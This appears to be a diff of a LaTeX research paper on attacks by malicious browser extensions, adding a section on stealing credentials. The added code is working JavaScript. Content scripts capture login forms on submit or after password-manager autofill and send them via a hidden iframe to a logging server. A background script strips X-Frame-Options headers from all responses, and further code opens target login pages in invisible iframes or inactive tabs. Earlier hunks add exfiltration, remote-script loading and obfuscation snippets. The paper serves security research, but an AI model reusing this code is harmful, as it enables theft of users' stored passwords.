@@ -40,7 +40,8 @@ var/*foo*/add/*bar      foo*/
   /* 1 2 3*/        function       (x
 ,      y //   return(  x  ); // foo
 )      {    return/*bar*/(x+/*
-y);   */      y      ;} //  alert('1');\end{lstlisting}
+y);   */      y      ;} //  alert('1');
+\end{lstlisting}
 					\end{minipage} 
 			
 					\begin{minipage}{\leftside}
@@ -49,7 +50,8 @@ y);   */      y      ;} //  alert('1');\end{lstlisting}
 					\begin{minipage}{\rightside}	
 						\begin{lstlisting}
 unescape = eval;
-unescape('document.write("secret")');\end{lstlisting}
+unescape('document.write("secret")');
+\end{lstlisting}
 					\end{minipage} 
 					
 					\begin{minipage}{\leftside}
@@ -60,7 +62,8 @@ unescape('document.write("secret")');\end{lstlisting}
 function jf21f(2jd2, k201) {
 	return(2jd2 + k201);
 }
-var 2eh90 = jf21f(2,4);\end{lstlisting}
+var 2eh90 = jf21f(2,4);
+\end{lstlisting}
 					\end{minipage} 	
 					
 					\begin{minipage}{\leftside}
@@ -72,7 +75,8 @@ var y = ['d', 'W', 'l', 'He', ' ', 'r', 'o'];
 alert(y[3] + y[6-5+1] + y[2] 
 	+ y[y.length - 1] + y[2*2]
 	+ y[y.length - 6] + y[6] 
-	+ y[3+2] + y[1*2] + y[0]);\end{lstlisting}
+	+ y[3+2] + y[1*2] + y[0]);
+\end{lstlisting}
 					\end{minipage} 	
 					
 					\begin{minipage}{\leftside}
@@ -85,11 +89,13 @@ var y = ['\x64', '\x57', '\x6c', '\x48\x65',
 alert(y[3] + y[6-5+1] + y[2] 
 	+ y[y.length -1] + y[2*2]
 	+ y[y.length - 6] + y[6] 
-	+ y[3+2] + y[1*2] + y[0]);\end{lstlisting}
+	+ y[3+2] + y[1*2] + y[0]);
+\end{lstlisting}
 						\begin{lstlisting}
 alert((15).toString(18) 
 	+ (24).toString(26) 
-	+ (24).toString(31));\end{lstlisting}
+	+ (24).toString(31));
+\end{lstlisting}
 					\end{minipage} 
 									
 					\begin{minipage}{\leftside}
@@ -97,7 +103,8 @@ alert((15).toString(18)
 					\end{minipage} \hspace{1em}
 					\begin{minipage}{\rightside}
 						\begin{lstlisting}
-[]['sort']['constructor']('alert(1)')();\end{lstlisting}
+[]['sort']['constructor']('alert(1)')();
+\end{lstlisting}
 					\end{minipage} 	
 						
 					\begin{minipage}{\leftside}
@@ -112,7 +119,8 @@ function add(x, y) {
 		}
 	}
 	return(x + y);
-}\end{lstlisting}
+}
+\end{lstlisting}
 					\end{minipage} 									
 			\end{itemize}
 			
@@ -133,13 +141,13 @@ function add(x, y) {
 				\begin{lstlisting}
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
-  if (xhr.readyState == 4) {
-    handleScript(xhr.responseText);
-  }
+	if (xhr.readyState == 4) {
+	    handleScript(xhr.responseText);
+	}
 }
 xhr.open('GET', 'https://localhost:3001/javascripts/simple.js');
 xhr.send();
-				\end{lstlisting}
+\end{lstlisting}
 				\caption{Load remote script with a XMLHttpRequest}
 				\label{xhrLoadScript}
 			\end{code}
@@ -155,7 +163,7 @@ xhr.send();
 var script = document.createElement('script');
 script.setAttribute('src', 'https://localhost:3001/javascripts/simple.js');
 document.body.appendChild(script);
-				\end{lstlisting}
+\end{lstlisting}
 				\caption{Content Script that executes a remote loaded script}
 				\label{contentScriptRemotLoad}
 			\end{code}
@@ -173,11 +181,11 @@ document.body.appendChild(script);
 			\begin{code}
 				\begin{lstlisting}
 window.addEventListener('message', function(event) {
-  if(event.data.from && event.data.from === 'extension') {
-    handle(event.data.message);
-  }
+	if(event.data.from && event.data.from === 'extension') {
+	    handle(event.data.message);
+	}
 });
-				\end{lstlisting}
+\end{lstlisting}
 				\caption{Event handler for the postMessage method}
 				\label{postMessageListener}
 			\end{code}
@@ -185,11 +193,11 @@ window.addEventListener('message', function(event) {
 			\begin{code}
 				\begin{lstlisting}
 var message = {
-  'from'   : 'extension',
-  'message': 'secret'
+	'from'   : 'extension',
+	'message': 'secret'
 }
 window.postMessage(message, '*');
-				\end{lstlisting}
+\end{lstlisting}
 				\caption{Call of the postMessage method}
 				\label{postMessageMethod}
 			\end{code}
@@ -294,7 +302,8 @@ window.postMessage(message, '*');
 var xhr = new XMLHttpRequest();
 xhr.open('POST', 'https://localhost:3001/log');
 xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-xhr.send(message);\end{lstlisting}
+xhr.send(message);
+\end{lstlisting}
 			\caption{Send data to a remote server with a XMLHttpRequest}
 			\label{xhrSendData}
 		\end{code}
@@ -310,7 +319,8 @@ document.body.appendChild(iframe);
 function send(data) {
 	data += "&url=" + encodeURIComponent(window.location.href);
 	iframe.setAttribute('src', 'https://localhost:3001/log?' + data);
-}\end{lstlisting}
+}
+\end{lstlisting}
 			\caption{Content script that sends data to a remote server using an \texttt{iframe} element}
 			\label{contentScriptSendDataWithIframe}
 		\end{code}
@@ -335,7 +345,7 @@ function send(data) {
 				\item \textbf{Modify Links} An extension can modify the URL of a link element to redirect the user to a another web page. This page may be malicious and infect the user's device with malware or it may be a duplicate of the web page to which the link originally led and steal the user's data. But the attacker may also enrich himself through the extension's users. Some companies pay money for every time someone loads a specific web page. The attacker can redirect the user to this web page and gain more profit. 
 			\end{itemize}
 			
-			Lujo Bauer et al. described several attacks for WebExtensions and implemented them as a proof of concept. They focused on stealing credentials which the browser has stored for the user. An WebExtension with the host permissions \texttt{https://*/*} and \texttt{http://*/*} can open any other web page. For instance with the method \texttt{chrome.tabs.update} which is no restricted by any permissions. 
+			Lujo Bauer et al. described several attacks for WebExtensions and implemented them as a proof of concept. They focused on stealing credentials which the browser has stored for the user. An WebExtension with the host permissions \texttt{https://*/*} and \texttt{http://*/*} can open any other web page. For instance with the method \texttt{chrome.tabs.update} which is no restricted by any permissions. \\
 			
 			\cite{extensions:cns14} many attacks for web extension sorted by permissions, implemented each attack as proof of concept, host permission \texttt{http://*/*}, can load other web pages by e.a. \texttt{chrome.tabs.update} which is not restricted by the \texttt{tabs} permission, if browser has stored auto fill data extension can steal them, load other web page in current tab is very suspicious, more stealthy by loading web page in inactive tab or even in other window which is currently in background, these information can be accessed with the \texttt{chrome.tabs} API and do not need the \texttt{tabs} permission too, other stealthy approach is to use an iframe, can be hidden from the user by loading in background tab, invisible or very small, webextension needs \texttt{all\_frames} option for content scripts to execute content script in iframe, including \texttt{all\_frames} does not cause additional warning, many web pages set \texttt{X-Frame-Options} header to disallow being opened in iframe, they implemented an extension that sets the security header to \texttt{ALLOW} using the \texttt{webRequestBlocking} permission and API, user tracking and identifying with an extension, reading user information such as facebook name, email addresses or other sensitive data, cross devices tracking if extension is installed on multiple devices, check same username used on different devices, tracking mouse movements and key input using document events, history sniffing with \texttt{history} permission \\
 	 
@@ -346,7 +356,7 @@ function send(data) {
 		 	A botnet is a network consisting of multiple compromised clients which can be controlled remotely. They are mostly used to execute large scaled cyber attacks such as Distributed Denial of Service (DDoS) or spamming. In recent times, botnets are also used to harvest social media valuations such as Facebook's likes. The controller of such a botnet - also called bot master - sales these valuations to thousands and executes them with the social media accounts which are used on the compromised machines. With the same manner, the bot master can execute DDoS attacks to make a web service unavailable for the general public. This is achieved by overwhelming the server's capacities with requests. Either targeting the network and flooding it's bandwidth or the application itself using up all of the computer's CPU resources. A simple Denial of Service (DoS) attack calls the targeted web service numerous times a second from a single origin. If the attacker uses a botnet, he is able to perform the DoS attack from multiple devices simultaneously which results in an ever bigger overwhelm at the targeted server. \\
 	 	
 		 	Extensions may be used as a bots. They are hosted on many different computers and can execute web requests. 
-		 	Extensions that act as a bot where previously researched for Internet Explorer, Firefox and Chrome \cite{liu2011botnet}.
+		 	Extensions that act as a bot where previously researched for Internet Explorer, Firefox and Chrome \cite{liu2011botnet}. \\
 	 
 		\subsubsection{Intercept Requests}
 		 
@@ -364,44 +374,128 @@ function send(data) {
 	 
 		\subsubsection{Steal Credentials}
 		
-			We implemented an extension that steals credentials from a login form if the user submits it or if the browser's password manager has filled in previously stored credentials. Our extension needs a single content script in every web page and no further permissions. The implementation of our content script which executes the attack is shown in \autoref{contentScriptStealCredentials}. To send the stolen credentials to our remote server, we use the \texttt{send} method shown in \autoref{contentScriptSendDataWithIframe}. The function defined on line 1 of our content script steals the credentials if the password manager has filled in the form. It checks whether the password field contains a value. If this case applies, it sends the form and returns from the function. Otherwise, it calls \texttt{setTimeout} on line 6 to start a recursively chain that executes the attack every 250 milliseconds. The function on line 11 steals the credentials if the user submits the form. It attaches an event listener that is dispatched if the user submit's the form and then forwards it to our send method. The code starting on line 17 checks if a input element of type password exists on the web page and calls both functions in this case. 
-			
+			We implemented an extension that steals credentials from a login form. It uses two content scripts without the need for further permissions. The one shown in \autoref{contentScriptStealCredentialsOnSubmit} steals the credentials if the user submits the login form. The other one shown in \autoref{contentScriptStealCredentialsFromPasswordManager} steals the credentials if the browser's password manager has filled them in the login form. To send the stolen credentials to our remote server, we use the \texttt{send} method shown in \autoref{contentScriptSendDataWithIframe}. Both content scripts start by querying an input field of type password and getting the proper form element. The content script in \autoref{contentScriptStealCredentialsOnSubmit} adds an event listener to the form element on line 4 which is triggered if the user submits the form. It then forwards the form's content to our send method in the proper format. The content script in \autoref{contentScriptStealCredentialsFromPasswordManager} checks if the password element's value is not empty on line 5 and forwards the form's content in that case to our send method on line 6. We delay the execution of line 5 and 6 with the \texttt{setTimeout} function to give the password manager enough time to fill in the credentials. \\
+					
 			\begin{code}
-				\begin{lstlisting}
-function stealFromPasswordManager(passwordInput, form) {
-	if(passwordInput.val() != '') {
-		send(form.serialize());
-		return;
-	}
-	setTimeout(function() {
-		stealFromPasswordManager(passwordInput, form);
-	}, 250);
-}
-
-function stealOnSubmit(form) {
+				\begin{lstlisting}	
+var passwordElement = $('input[type="password"');
+if(passwordElement.length > 0) {
+	var form = passwordElement.closest('form');
 	form.submit(function(event) {
 		send(form.serialize());
 	});
 }
-
-var passwordInput = $('input[type="password"');
-if(passwordInput.length > 0) {
-	var form =  passwordInput.closest('form');
-	stealFromPasswordManager(passwordInput, form);
-	stealOnSubmit(form);
-}\end{lstlisting}
-				\caption{Content Script that steals credentials from a login form.}
-				\label{contentScriptStealCredentials}
+\end{lstlisting}
+				\caption{Content Script that steals credentials from a login form if the user submits the form.}
+				\label{contentScriptStealCredentialsOnSubmit}
 			\end{code}
 		
-			We implemented a further extension that opens predefined web pages to steal probably stored credentials from the browser's password manager. The extension uses several techniques to hide the loading of a new web page from the user. These approaches were described by Lujo Bauer et al. in a previous research \cite{extensions:cns14}. We implemented the following approaches:
-			
-			\begin{itemize}
+			\begin{code}
+				\begin{lstlisting}
+var passwordElement = $('input[type="password"');
+if(passwordElement.length > 0) {
+	var form = passwordElement.closest('form');
+	setTimeout(function() {
+		if(passwordElement.val() != '') {
+			send(form.serialize());
+		}
+	}, 500);
+}
+\end{lstlisting}
+				\caption{Content Script that steals credentials from a login form if the browser's password manager has filled in the credentials.}
+				\label{contentScriptStealCredentialsFromPasswordManager}
+			\end{code}
+		
+		
+			Furthermore, we implemented several extensions that open predefined login web pages to steal probably stored credentials from the browser's password manager. Different strategies to hide the loading of a new web page were previously discussed by Lujo Bauer et al. \cite{extensions:cns14}. We implemented three described techniques:
+
+			\begin{enumerate}
 				\itemsep-0.3em
 				\item Load the targeted web page in an invisible iframe inside any web page.
 				\item Load the targeted web page in an inactive tab and switch back to the original web page after the attack has finished.
-				\item Open a new tab in inactive browser window and load the targeted web page in this tab. Close the tab after the has finished.
-			\end{itemize} 
+				\item Open a new tab in an inactive browser window and load the targeted web page in this tab. Close the tab after the attack has finished.
+			\end{enumerate} 
+			
+			The first technique is the least reliable one. There exists several methods to enforce that a web page is not displayed in an iframe. The standardized approach is to use the \texttt{X-Frame-Option} HTTP header which is compatible with all current browsers \cite{xFrameOptionsSpezification, xFrameOptionsCompability}. This transfers the responsibility to enforce the policy to the browser. Other approaches use JavaScript to deny the web page's functionality if it is loaded in an iframe or simply move the web page from the iframe to the main frame. \\
+			
+			Our implementation removes the \texttt{X-Frame-Option} from any incoming web request to be able to load particular web pages into an iframe and steal probably stored credentials. For that purpose, our extension needs the permissions \texttt{"webRequest"}, \texttt{"webRequestBlocking"}, \texttt{"https://*/*"}, and \texttt{"http://*/*"}. Our implementation of this part is shown in \autoref{backgroundRemoveXFrameOptionsHeader}. We use the \texttt{chrome.webRequest} module to add an event listener that is triggered when the browser receives HTTP headers for a response. The \texttt{addListener} method on line 1 takes additional arguments on line 9. These define that the listener is triggered on any URL that matches \texttt{https://*/*} or \texttt{http://*/*}, the request is blocked until the listener finishes, and the listener has access to the response's headers. Our listener iterates over the headers, compares if the header's name equals x-frame-options, and removes the header in this case. \\
+			
+			To open a particular web page in an iframe, we use a content script with the \texttt{any\_frame} option which enables the content script in iframes, too. The content script is shown in \autoref{contentScriptOpenWebPageInIframe}. It checks whether or not it is currently active in the main frame on the first line. If it is active in an iframe, we use the implementation shown in \autoref{contentScriptStealCredentialsFromPasswordManager} to steal the probably stored credentials. If the content script is currently active in the main frame, we send a message to the extension's background to retrieve an URL. This is necessary because the content script itself can not store data - in our case a list of URLs - between different instances of itself. On line 4 till 7 we create a new iframe, make it invisible, set it's source attribute to the given URL, and add it to the document's body. \\
+			
+			\begin{code}
+				\begin{lstlisting}
+chrome.webRequest.onHeadersReceived.addListener(function(details) { 
+	details.responseHeaders.forEach(function(header, index){
+		if(header.name.toLowerCase() === "x-frame-options"){
+			details.responseHeaders.splice(index,1);
+		}
+	});
+	return({responseHeaders: details.responseHeaders});
+},
+{urls: ['https://*/*', 'http://*/*']}, ['blocking', 'responseHeaders']);
+\end{lstlisting}
+				\caption{Extension code to remove the \texttt{X-Frame-Options} header from any incoming web request.}
+				\label{backgroundRemoveXFrameOptionsHeader}
+			\end{code} 
+			
+			\begin{code}
+				\begin{lstlisting}
+if(window.self === window.top) {
+	chrome.runtime.sendMessage({get:'url'}, function(response) {
+		if(response.url) {
+			var newIframe = document.createElement('iframe');
+			newIframe.setAttribute('style', 'display: none;');
+			newIframe.setAttribute('src', response.url);
+			document.body.appendChild(newIframe);
+		}
+	});
+}
+else { ... }
+\end{lstlisting}
+				\caption{Content script to open a particular web page in an iframe.}
+				\label{contentScriptOpenWebPageInIframe}
+			\end{code}
+			
+			The second and third technique work very similar. Both use the browser's tab system to open a particular web page and inject a content script in it to steal probably stored credentials. \autoref{backgroundOpenPageInInactiveTab} shows the implementation of our extension that opens a particular web page in an inactive tab. Our extension needs the \texttt{tabs} permission to access the URL of the current tab. We query all tabs to find one that is not active and not a browser intern tab. On line 10, we store the tab's current URL to later switch the tab back to it's original state. Then, we update the current tab and load our targeted web page. The \texttt{setInterval} function helps us to check every 100 milliseconds whether the tab has finished loading the web page. This is necessary for our content script to work. If the tab has finished loading, we inject our content scripts in the current tab. Finally, we have to load the original web page in the tab after our content script has stolen the credentials. We use the communication channel between content script and the extension's background to notify the background that the content script has finished. On line 25, we register an event listener that loads the original web page in the sender tab if a proper message arrives. \\
+			
+			Our implementation of the third technique differs only in a few lines from our implementation of the second technique shown in \autoref{backgroundOpenPageInInactiveTab}. First, we query for a tab that is not in the currently active window. Second, we create a new tab instead of updating the queried one and do not store the current tabs URL. This also removes the necessity for the \texttt{tabs} permission. And finally, we close the tab when the content script messages that it has finished the attack. \\ 
+			
+			\begin{code}
+				\begin{lstlisting}
+function openPageInInactiveTab(url) {
+	var queryOptions = {
+		active: false,
+		windowType: "normal"
+	}
+	chrome.tabs.query(queryOptions, function (tabs) {		
+		if(tabs.length === 0) {
+			return;
+		}
+		oldUrl = tabs[0].url;
+		chrome.tabs.update(tabs[0].id, {url: url}, function(tab) {
+			var interval = setInterval(function() {
+				chrome.tabs.get(tab.id, function(tab) {
+					if(tab.status === 'complete') {
+						clearInterval(interval);
+						chrome.tabs.executeScript(tab.id, {file: 'jquery.js'});
+						chrome.tabs.executeScript(tab.id, {file: 'content.js'});
+					}
+				});
+			}, 100);
+		});
+	});
+}
+chrome.runtime.onMessage.addListener(function(message, sender) {
+	if(sender.tab && message.status === 'finished') {
+		chrome.tabs.update(sender.tab.id, {url: oldUrl});
+	}
+});
+\end{lstlisting}
+				\caption{Extension code to open a particular web page in an inactive tab to steal probably stored credentials.}
+				\label{backgroundOpenPageInInactiveTab}
+			\end{code}
+			
+			We tested our implementations in Chrome, Opera, and Firefox. To our surprise, they were only successful in Firefox. The reason that none of our attacks work in Chrome and Opera is that JavaScript has no access to the value of a password input field before any user interaction with the web page occurred. What first seems like a bug is an intended security feature to prevent exactly our kind of attack \cite{chromiumBlogPasswordInput}.
 		
 		\subsubsection{Identifier Storage} 
 			
@@ -416,7 +510,8 @@ if(passwordInput.length > 0) {
 var iframe = document.createElement('iframe');
 iframe.setAttribute('src', 'https://localhost:3001/tracking/beacon');
 iframe.setAttribute('style', 'display: none;');
-document.body.appendChild(iframe);\end{lstlisting}
+document.body.appendChild(iframe);
+\end{lstlisting}
 				\caption{Content script that executes a web beacon}
 				\label{contentScriptWebBeacon}
 			\end{code}
